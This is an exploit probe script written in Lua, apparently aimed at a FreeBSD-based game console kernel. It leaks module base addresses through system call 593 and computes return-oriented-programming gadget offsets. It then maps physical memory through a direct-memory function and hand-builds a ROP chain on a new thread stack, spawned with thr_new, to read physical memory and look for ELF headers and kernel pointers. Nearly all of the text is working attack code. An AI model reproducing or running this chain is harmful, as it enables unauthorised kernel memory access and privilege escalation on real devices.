-- CRASH_CLASS: MODERATE
-- PROBE 562l: Minimal physical memory read — 1 qword only
--
-- 562k: child reads 16 qwords → ~230 "77" traces → process dies before main prints.
-- Hypothesis: fewer faults = main thread survives and prints results.
--
-- Read just 1 qword from phys 0x100000000. Chain is ~16 entries (vs 115).
-- If main thread prints results → scale up.
-- If still dies → threshold is very low, need binary extraction.

print("=== PROBE 562l: MINIMAL PHYS READ (1 qword) ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rb(a)
    local d = rd(a); if d == nil then return nil end
    if d < 0 then d = d + 0x100000000 end; return d
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end

local Z = uint64(0)
local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)

local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(Z, ib) end)
local elo = rd(N(ib) + 0x108) or 0; local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))

wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0x2001), ib) end)
local llo = rd(N(ib) + 0x108) or 0; local lhi = rd(N(ib) + 0x10C) or 0
if llo < 0 then llo = llo + 0x100000000 end
if lhi < 0 then lhi = lhi + 0x100000000 end
local lk = uint64(string.format("0x%X%08X", lhi, llo))
local mapdm_fn = lk + uint64(0x15020)

print(string.format("eb=0x%X%08X lk=0x%X%08X", ehi, elo, lhi, llo))

local g_pop_rax = eb + 0x992
local g_pop_rdi = eb + 0xC9DFE
local g_pop_rsi = eb + 0xD77D
local g_bare_ret = eb + 0x42
local g_mov_m_rax = eb + 0x92C67
local g_mov_rax_m = eb + 0x1A5CC4

io.flush()

-- ============================================================
-- [A] MapDM phys 0x100000000
-- ============================================================
print("[A] MapDM phys 0x100000000")
local sc477 = mk(477)
local mapped_va = uint64("0x880000000")
pcall(function()
    sc477(mapped_va, uint64(0x4000), uint64(3),
        uint64(0x1012), uint64(0xFFFFFFFF), Z)
end)
local ok_md, rv_md = pcall(function()
    return native.fcall_with_rax(mapdm_fn, 0,
        mapped_va, uint64(0x4000), uint64(3), Z,
        uint64("0x100000000"), uint64(0x4000))
end)
print("MapDM rv=" .. (ok_md and N(rv_md) or -999))
io.flush()

-- ============================================================
-- [B] Shared buffer + mmap stack
-- ============================================================
local shared = memory.alloc(0x20)
for i = 0, 0x1C, 4 do wd(N(shared) + i, 0) end
local sh = N(shared)

local ss = 0x4000
local ok_stk, sb_raw = pcall(function()
    return sc477(Z, uint64(ss), uint64(3),
        uint64(0x1002), uint64(0xFFFFFFFF), Z)
end)
local sb = N(sb_raw)
local rsp = sb + ss - ((sb + ss) % 16) - 8

-- ============================================================
-- [C] Build MINIMAL chain: 1 qword read + sentinel + thr_exit
-- ============================================================
print("[C] building chain")
local off = 0
local function emit(v) wq(rsp + off, v); off = off + 8 end

-- Read 1 qword: mapped_va+0 → shared+8
emit(g_pop_rsi); emit(mapped_va)
emit(g_mov_rax_m)
emit(g_pop_rdi); emit(uint64(sh + 8))
emit(g_mov_m_rax)

-- Sentinel DEADFACE → shared+0
emit(g_pop_rax); emit(uint64(0xDEADFACE))
emit(g_pop_rdi); emit(uint64(sh))
emit(g_mov_m_rax)

-- thr_exit(0) via fn_addr
emit(g_pop_rdi); emit(Z)
emit(g_pop_rax); emit(uint64(431))
emit(stub)

print(string.format("chain: %d entries (%d bytes)", off/8, off))

-- thr_param (0x38 bytes)
local pa = memory.alloc(0x40)
for i = 0, 0x3C, 4 do wd(N(pa) + i, 0) end
wq(N(pa), g_bare_ret)          -- start_func (+0)
wq(N(pa) + 8, Z)               -- arg (+8)
wq(N(pa) + 0x10, uint64(sb))   -- stack_base (+0x10)
wq(N(pa) + 0x18, uint64(ss))   -- stack_size (+0x18)
local tid_buf = memory.alloc(8); wq(N(tid_buf), Z)
wq(N(pa) + 0x30, tid_buf)      -- child_tid (+0x30)

io.flush()

-- ============================================================
-- [D] Spawn + wait
-- ============================================================
print("[D] spawning child...")
io.flush()

local ok_tn, rv_tn = pcall(function() return mk(455)(pa, uint64(0x38)) end)
print("thr_new ret=" .. (ok_tn and N(rv_tn) or -999))
io.flush()

-- Wait for sentinel
local found = false
for w = 1, 30000 do
    for j = 1, 20 do local x = j * j end
    local s = rb(sh) or 0
    if s == 0xDEADFACE then found = true; break end
end

-- ============================================================
-- [E] Results
-- ============================================================
print("")
print("========================================")
local sv = rb(sh) or 0
print(string.format("sentinel=0x%X found=%s", sv, tostring(found)))

if sv == 0xDEADFACE then
    local lo = rb(sh + 8) or 0
    local hi = rb(sh + 12) or 0
    local tag = ""
    if lo == 0x464C457F then tag = " *** ELF! ***" end
    if hi >= 0xFFFF8000 and hi < 0xFFFFFFFF then tag = tag .. " KPTR?" end
    print(string.format("phys[0x100000000]+0 = 0x%08X_%08X%s", hi, lo, tag))
else
    print("TIMEOUT: no sentinel")
end

io.flush()
local pid2 = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid2 .. (pid2 == pid_val and " ALIVE" or " DEAD"))
print("=== 562l DONE ===")
